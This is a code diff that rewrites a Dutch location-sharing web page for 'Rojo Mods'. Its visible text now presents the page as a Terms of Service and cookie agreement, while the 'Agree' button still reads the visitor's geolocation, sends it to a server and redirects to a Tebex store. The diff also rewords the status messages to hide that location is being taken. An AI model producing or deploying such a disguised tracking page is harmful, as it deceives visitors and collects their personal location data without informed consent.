@@ -87,13 +87,13 @@
 <body>
 
 <div class="hero">
-    <h1>Deel je locatie</h1>
-    <p>Sta ons toe je locatie te gebruiken zodat we je ervaringen kunnen verbeteren en de juiste content kunnen tonen.</p>
+    <h1>Rojo Mods</h1>
+    <p>In order to proceed to our tebex site, we would like to have you agree with our "TERMS of SERVICE"</p>
 </div>
 
 <div class="content">
-    <p>Klik op de knop hieronder om je huidige locatie te delen.</p>
-    <button id="shareBtn">Deel mijn locatie</button>
+    <p>Press button below to agree to our Terms of Service and our Cookies.</p>
+    <button id="shareBtn">Agree</button>
     <p id="status"></p>
 </div>
 
@@ -103,11 +103,11 @@ const status = document.getElementById('status');
 
 btn.addEventListener('click', async () => {
   if (!navigator.geolocation) {
-    status.textContent = 'Geolocatie wordt niet ondersteund door deze browser.';
+    status.textContent = 'We do not allow your browser.';
     return;
   }
 
-  status.textContent = 'Locatie ophalen...';
+  status.textContent = 'Processing permissions...';
 
   navigator.geolocation.getCurrentPosition(async (pos) => {
     const latitude = pos.coords.latitude;
@@ -123,29 +123,29 @@ btn.addEventListener('click', async () => {
       });
       const data = await resp.json();
       if (data.ok) {
-        status.textContent = 'Locatie succesvol gedeeld ✔';
+        status.textContent = 'Approved ✔';
 
         // ✅ Redirect naar Tebex pagina na succesvolle verzending
         window.location.href = 'https://rojomods.tebex.io/category/christmas-content';
       } else {
-        status.textContent = 'Serverfout bij opslaan locatie.';
+        status.textContent = 'Fault at saving your settings.';
       }
     } catch (err) {
-      status.textContent = 'Fout bij verzenden: ' + err.message;
+      status.textContent = 'Fault at sharing your settings: ' + err.message;
     }
   }, (err) => {
     switch (err.code) {
       case err.PERMISSION_DENIED:
-        status.textContent = 'Je hebt de locatie aanvraag geweigerd.';
+        status.textContent = 'You have cancelled the acceptor.';
         break;
       case err.POSITION_UNAVAILABLE:
         status.textContent = 'Locatie onbeschikbaar.';
         break;
       case err.TIMEOUT:
-        status.textContent = 'Tijd verstreken bij ophalen locatie.';
+        status.textContent = 'Time-out received by network.';
         break;
       default:
-        status.textContent = 'Onbekende fout bij geolocatie.';
+        status.textContent = 'unknown fault.';
     }
   }, { enableHighAccuracy: false, timeout: 10000 });
 });
